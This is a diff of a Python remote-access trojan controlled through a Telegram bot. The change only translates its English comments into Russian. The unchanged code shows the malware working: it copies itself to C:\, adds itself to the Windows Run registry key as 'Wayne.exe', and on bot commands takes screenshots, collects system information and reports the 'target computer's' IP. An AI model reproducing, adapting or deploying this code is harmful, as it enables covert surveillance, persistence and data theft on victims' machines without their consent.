@@ -12,7 +12,7 @@ import socket
 import winreg
 
 
-tg_bOt = telebot.TeleBot("!!!YOUR-API-TELEGRAM-BOT-KEY-HERE!!!")  # <---- PASTE TELEGRAM API KEY
+tg_bOt = telebot.TeleBot("!!!YOUR-API-TELEGRAM-BOT-KEY-HERE!!!")  # <---- Вставить свой API ключ 
 
 @tg_bOt.message_handler(commands=['screen'])
 def send_screenshot(message):
@@ -28,11 +28,11 @@ def send_screenshot(message):
 
         tg_bOt.send_photo(chAt_id, screenshot_buffer)
 
-# MAKING A COPY 
+# Создание копии 
 
 def create_copy():
     current_file = sys.argv[0]
-    target_directory = 'C:\\' # <---You can choose your own place for copied  file HERE
+    target_directory = 'C:\\' # <--- Если нужно, укажите желаемую директорию для копии файла.
     filename = os.path.basename(current_file)
     target_path = os.path.join(target_directory, filename)
     shutil.copy(current_file, target_path)
@@ -40,14 +40,14 @@ def create_copy():
 create_copy()
 
 
-# ADD TO STARTUP
+# Добавление в авторан
 def create_marker_file():
-    marker_path = "C:\\Wayne.marker"
+    marker_path = "C:\\Wayne.marker"  # <--- Если нужно, укажите желаемую директорию для маркера.
     with open(marker_path, "w") as file:
         file.write("Marker file for Wayne")
 
 def is_first_run():
-    marker_path = "C:\\Wayne.marker" # And define your path for marker file that will be created
+    marker_path = "C:\\Wayne.marker" # <--- Если изменили путь маркера, укажите его также здесь
     return not os.path.exists(marker_path)
     
 def add_to_startup(file_path):
@@ -55,14 +55,14 @@ def add_to_startup(file_path):
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
     winreg.SetValueEx(key, "Wayne.exe", 0, winreg.REG_SZ, executable)
     winreg.CloseKey(key)
-file_path = "C:\\Wayne.exe"
+file_path = "C:\\Wayne.exe"  # <---- Если указывали новый путь копии, укажите также здесь
 if is_first_run():
     shutil.copyfile(sys.executable, file_path)
     add_to_startup(file_path)
     create_marker_file()
 
 
-# GET -SYSTEMINFO-
+# Получить инфо о системе
 @tg_bOt.message_handler(commands=['systeminfo'])
 def systeminfo(message):
     try:
@@ -86,7 +86,7 @@ def systeminfo(message):
 
 
 
-# GET TARGET COMPUTER IP
+# Получить IP
 @tg_bOt.message_handler(commands=['ip'])
 def send_ip(message):
     response = requests.get("https://api.ipify.org/?format=json")
